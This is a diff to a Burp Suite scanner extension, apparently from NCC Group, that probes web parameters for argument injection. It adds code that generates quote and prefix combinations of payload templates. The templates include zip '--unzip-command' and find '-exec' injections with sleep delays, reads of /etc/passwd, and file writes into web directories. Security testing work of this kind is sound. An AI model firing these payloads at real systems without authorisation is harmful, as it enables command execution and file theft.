@@ -11,12 +11,14 @@ import pickle
 import time
 import os
 import binascii
+import re
+import itertools
 
 TARGET_FILES = ["/etc/passwd", "file:///etc/passwd"]
 TARGET_CONTENTS = ["root:x:0:0", "root:*:0:0"]
 TARGET_DIRECTORIES = ["/var/www/html/", "/var/www/"]
 TARGET_SHELL_DELAY = ["sleep${IFS}20", "sleep 20"]
-PREFIXES = [("", False), ("test ", False), ("'", True),("\"", True)]
+PREFIXES = [("test ", "'"), ("test ", "\"")]
 TIMEOUT = 20
 
 PAYLOAD_SHELL = 0
@@ -24,7 +26,7 @@ PAYLOAD_WRITE = 1
 PAYLOAD_READ = 2
 PAYLOAD_LANG_DELAY = 3
 
-PAYLOADS = [("{QUOTE_WITH_SPACE}-T --unzip-command {AH_SHELL}; {QUOTE}", PAYLOAD_SHELL, "zip"),
+PAYLOADS = [("-T --unzip-command {QUOTE}{AH_SHELL}; {QUOTE}", PAYLOAD_SHELL, "zip"),
 	("/dev/null{QUOTE} -exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
 	("{QUOTE_WITH_SPACE}* -exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
 	("{QUOTE_WITH_SPACE}-exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
@@ -93,7 +95,7 @@ class BurpExtender(IBurpExtender, IScannerCheck, ITab):
 		self._stdout.println('== AIH "" Hammer Smash Party =====')
 		self._stdout.println('== Neil Bergman - NCC Group  =====')
 		self._stdout.println('==================================')
-
+		
 		self._checkbox_brute = self._define_check_box("Brute-force Short Argument Flags", False)
 		self._button_save = JButton("Save Configuration", actionPerformed=self._save_config)
 
@@ -227,29 +229,76 @@ class BurpExtender(IBurpExtender, IScannerCheck, ITab):
 				# Ignore this type of payload if the user doesn't want to brute force short argument flags. 
 				continue
 		
-			for prefix in PREFIXES:
-				prefix_value = prefix[0]
-				quote_prefix = prefix[1]
+			#parse payload on QUOTE
+			injection_list = filter(None,re.split(r'({QUOTE}|{QUOTE_WITH_SPACE})',injection))
+			injection_list.insert(0, "{PREFIX}")
+			#get mandatory elements that are not QUOTE
+			mandatory_list = [i for i,x in enumerate(injection_list) if x != '{QUOTE}' and x != '{QUOTE_WITH_SPACE}' and x != '{PREFIX}']
 
-				if quote_prefix == True and "{QUOTE}" not in injection:
-					# Don't test quote prefix if payload doesn't have quote placeholders.
-					continue
-				elif quote_prefix == True:
-					# Replace the quote placeholders with actual quotes.
-					temp_injection_1 = injection.replace("{QUOTE}", prefix_value)
-					temp_injection_1 = temp_injection_1.replace("{QUOTE_WITH_SPACE}", prefix_value + " ")
-				else:
-					# Remove quote placeholders from payload.
-					temp_injection_1 = injection.replace("{QUOTE}", "")
-					temp_injection_1 = temp_injection_1.replace("{QUOTE_WITH_SPACE}", "")				
-					temp_injection_1 = prefix_value + temp_injection_1		
+			#get quote position
+			quote_list = [x for x in range(len(injection_list)) if x not in mandatory_list]
+				
+			comb=[]
+			for i in range(len(injection_list) - len(mandatory_list)+1):
+				comb += itertools.combinations(quote_list, i)
+			for i in list(comb): 
+				final_comb = list(i) + mandatory_list
+				final_comb.sort()
+				res_list = [injection_list[i] for i in final_comb]
+				injection = ''.join(res_list)
+				
+				if "{QUOTE" not in injection:
+					prefixes = [i[0] for i in PREFIXES]
+					prefixes = list(dict.fromkeys(prefixes))
+					prefixes = [(i,"0") for i in prefixes]
+				else: 
+					prefixes =  PREFIXES
+					
+				for prefix in prefixes:
+					prefix_value = prefix[0]
+					quote_value = prefix[1]
 
-				if injection_type == PAYLOAD_SHELL:
-					for injection_replacement in TARGET_SHELL_DELAY:
-						temp_injection_2 = temp_injection_1.replace("{AH_SHELL}", injection_replacement)
-						self._log("Payload: " + temp_injection_2)
+					temp_injection_1 = injection.replace("{QUOTE}", quote_value)
+					temp_injection_1 = temp_injection_1.replace("{QUOTE_WITH_SPACE}", quote_value + " ")
+					temp_injection_1 = temp_injection_1.replace("{PREFIX}", prefix_value)
+						
+					if injection_type == PAYLOAD_SHELL:
+						for injection_replacement in TARGET_SHELL_DELAY:
+							temp_injection_2 = temp_injection_1.replace("{AH_SHELL}", injection_replacement)
+							self._log("Payload: " + temp_injection_2)
 
-						checkRequest = insertionPoint.buildRequest(temp_injection_2)
+							checkRequest = insertionPoint.buildRequest(temp_injection_2)
+							self._stdout.println(temp_injection_2)
+
+							timer = time.time()
+							checkRequestResponse = self._callbacks.makeHttpRequest(
+								baseRequestResponse.getHttpService(), checkRequest)
+							timer = time.time() - timer
+							self._log("Response Time: " + str(timer))
+
+							if timer > TIMEOUT:
+								checkRequest_2 = insertionPoint.buildRequest("test")
+								timer_2 = time.time()
+								checkRequestResponse_2 = self._callbacks.makeHttpRequest(
+								baseRequestResponse.getHttpService(), checkRequest_2)
+								timer_2 = time.time() - timer_2
+								self._log("Response Time: " + str(timer_2))
+
+								if timer_2 < TIMEOUT:
+									requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
+									write_up = self._get_write_up(PAYLOAD_SHELL, injection_command_target, temp_injection_2, None)
+
+									if write_up:
+										return [CustomScanIssue(
+											baseRequestResponse.getHttpService(),
+											self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+											[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
+											write_up[0], write_up[1], "High")]
+
+					if injection_type == PAYLOAD_LANG_DELAY:
+						self._log("Payload: " + temp_injection_1)
+						checkRequest = insertionPoint.buildRequest(temp_injection_1)
+						self._stdout.println(temp_injection_1)
 
 						timer = time.time()
 						checkRequestResponse = self._callbacks.makeHttpRequest(
@@ -258,112 +307,85 @@ class BurpExtender(IBurpExtender, IScannerCheck, ITab):
 						self._log("Response Time: " + str(timer))
 
 						if timer > TIMEOUT:
-							checkRequest_2 = insertionPoint.buildRequest("test")
-							timer_2 = time.time()
-							checkRequestResponse_2 = self._callbacks.makeHttpRequest(
-							baseRequestResponse.getHttpService(), checkRequest_2)
-							timer_2 = time.time() - timer_2
-							self._log("Response Time: " + str(timer_2))
+							checkRequest2 = insertionPoint.buildRequest("test")
+							timer2 = time.time()
+							checkRequestResponse2 = self._callbacks.makeHttpRequest(
+							baseRequestResponse.getHttpService(), checkRequest2)
+							timer2 = time.time() - timer2
+							self._log("Response Time: " + str(timer2))
 
-							if timer_2 < TIMEOUT:
-								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
-								write_up = self._get_write_up(PAYLOAD_SHELL, injection_command_target, temp_injection_2, None)
+							if timer2 < TIMEOUT:
+								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_1)]
+								write_up = self._get_write_up(PAYLOAD_LANG_DELAY, injection_command_target, temp_injection_1, None)
 
 								if write_up:
 									return [CustomScanIssue(
 										baseRequestResponse.getHttpService(),
 										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
 										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
-										write_up[0], write_up[1], "High")]
+										write_up[0], write_up[1], "High")]		
 
-				if injection_type == PAYLOAD_LANG_DELAY:
-					self._log("Payload: " + temp_injection_1)
-					checkRequest = insertionPoint.buildRequest(temp_injection_1)
+					if injection_type == PAYLOAD_WRITE:
+						for target_directory in TARGET_DIRECTORIES:
+							random_file = binascii.b2a_hex(os.urandom(10))
+							target_file = target_directory + random_file					
 
-					timer = time.time()
-					checkRequestResponse = self._callbacks.makeHttpRequest(
-						baseRequestResponse.getHttpService(), checkRequest)
-					timer = time.time() - timer
-					self._log("Response Time: " + str(timer))
+							temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
+							temp_injection_bytes = bytearray(temp_injection_2)
+							self._log("Payload: " + temp_injection_2)
+						
+							checkRequest = insertionPoint.buildRequest(temp_injection_2)
+							self._stdout.println(temp_injection_2)
+							checkRequestResponse = self._callbacks.makeHttpRequest(
+								baseRequestResponse.getHttpService(), checkRequest)
+							self._log("Original HTTP Request (Bytes): \n" + self._string_to_hex(self._helpers.bytesToString(checkRequest)))
 
-					if timer > TIMEOUT:
-						checkRequest2 = insertionPoint.buildRequest("test")
-						timer2 = time.time()
-						checkRequestResponse2 = self._callbacks.makeHttpRequest(
-						baseRequestResponse.getHttpService(), checkRequest2)
-						timer2 = time.time() - timer2
-						self._log("Response Time: " + str(timer2))
+							response_info = self._make_http_request(baseRequestResponse, random_file)
+							response_status_code = response_info.getStatusCode()		
+							self._log("Status: " + str(response_status_code))
 
-						if timer2 < TIMEOUT:
-							requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_1)]
-							write_up = self._get_write_up(PAYLOAD_LANG_DELAY, injection_command_target, temp_injection_1, None)
+							if response_status_code == 200:
+								random_file_2 = binascii.b2a_hex(os.urandom(10))
+								response_info_2 = self._make_http_request(baseRequestResponse, random_file_2)
+								response_status_code_2 = response_info_2.getStatusCode()
+								self._log("Status: " + str(response_status_code_2))
 
-							if write_up:
-								return [CustomScanIssue(
-									baseRequestResponse.getHttpService(),
-									self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-									[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
-									write_up[0], write_up[1], "High")]		
+								if response_status_code_2 != 200:
+									requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
+									write_up = self._get_write_up(PAYLOAD_WRITE, injection_command_target, temp_injection_2, target_file)
+									if write_up:
+										return [CustomScanIssue(
+											baseRequestResponse.getHttpService(),
+											self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+											[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
+											write_up[0], write_up[1], "High")]
 
-				if injection_type == PAYLOAD_WRITE:
-					for target_directory in TARGET_DIRECTORIES:
-						random_file = binascii.b2a_hex(os.urandom(10))
-						target_file = target_directory + random_file					
+					if injection_type == PAYLOAD_READ:
+						for target_file in TARGET_FILES:
+							temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
+							temp_injection_bytes = bytearray(temp_injection_2)
+							self._log("Payload: " + temp_injection_2)
+						
+							checkRequest = insertionPoint.buildRequest(temp_injection_2)
+							self._stdout.println(temp_injection_2)
+							checkRequestResponse = self._callbacks.makeHttpRequest(
+								baseRequestResponse.getHttpService(), checkRequest)
 
-						temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
-						temp_injection_bytes = bytearray(temp_injection_2)
-						self._log("Payload: " + temp_injection_2)
-					
-						checkRequest = insertionPoint.buildRequest(temp_injection_2)
-						checkRequestResponse = self._callbacks.makeHttpRequest(
-							baseRequestResponse.getHttpService(), checkRequest)
-						self._log("Original HTTP Request (Bytes): \n" + self._string_to_hex(self._helpers.bytesToString(checkRequest)))
+							for target_content in TARGET_CONTENTS:
+								target_content_bytes = bytearray(target_content)
+								matches = self._get_matches(checkRequestResponse.getResponse(), target_content_bytes)
+								orig_matches = self._get_matches(baseRequestResponse.getResponse(), target_content_bytes)
 
-						response_info = self._make_http_request(baseRequestResponse, random_file)
-						response_status_code = response_info.getStatusCode()		
-						self._log("Status: " + str(response_status_code))
-
-						if response_status_code == 200:
-							random_file_2 = binascii.b2a_hex(os.urandom(10))
-							response_info_2 = self._make_http_request(baseRequestResponse, random_file_2)
-							response_status_code_2 = response_info_2.getStatusCode()
-							self._log("Status: " + str(response_status_code_2))
-
-							if response_status_code_2 != 200:
-								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
-								write_up = self._get_write_up(PAYLOAD_WRITE, injection_command_target, temp_injection_2, target_file)
-								if write_up:
-									return [CustomScanIssue(
-										baseRequestResponse.getHttpService(),
-										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
-										write_up[0], write_up[1], "High")]
-
-				if injection_type == PAYLOAD_READ:
-					for target_file in TARGET_FILES:
-						temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
-						temp_injection_bytes = bytearray(temp_injection_2)
-						self._log("Payload: " + temp_injection_2)
-					
-						checkRequest = insertionPoint.buildRequest(temp_injection_2)
-						checkRequestResponse = self._callbacks.makeHttpRequest(
-							baseRequestResponse.getHttpService(), checkRequest)
-
-						for target_content in TARGET_CONTENTS:
-							target_content_bytes = bytearray(target_content)
-							matches = self._get_matches(checkRequestResponse.getResponse(), target_content_bytes)
-							orig_matches = self._get_matches(baseRequestResponse.getResponse(), target_content_bytes)
-
-							if len(matches) > 0 and len(orig_matches) == 0:
-								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_bytes)]
-								write_up = self._get_write_up(PAYLOAD_READ, injection_command_target, temp_injection_2, target_file)
-								
-								if write_up:
-									return [CustomScanIssue(
-										baseRequestResponse.getHttpService(),
-										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches)],
-										write_up[0], write_up[1], "High")]	
+								if len(matches) > 0 and len(orig_matches) == 0:
+									requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_bytes)]
+									write_up = self._get_write_up(PAYLOAD_READ, injection_command_target, temp_injection_2, target_file)
+									
+									if write_up:
+										return [CustomScanIssue(
+											baseRequestResponse.getHttpService(),
+											self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+											[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches)],
+											write_up[0], write_up[1], "High")]	
 
 		return None
 
